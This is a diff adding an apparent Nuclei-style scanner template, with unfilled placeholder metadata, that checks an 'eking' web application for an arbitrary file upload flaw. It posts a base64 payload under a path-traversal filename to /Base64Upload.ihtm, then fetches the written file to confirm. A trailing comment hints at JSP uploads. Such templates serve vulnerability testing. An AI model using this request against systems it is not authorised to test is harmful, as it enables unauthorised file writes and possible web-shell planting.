@@ -1,0 +1,31 @@
+id: eking-Base64Upload-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"  
+http:
+  - raw:
+      - |-
+        POST /Base64Upload.ihtm HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 52
+
+        base64_str=data:image//../../../{{filename}}.txt.;base64,MTIz
+      - |+
+        GET /{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 123
+#.jsp
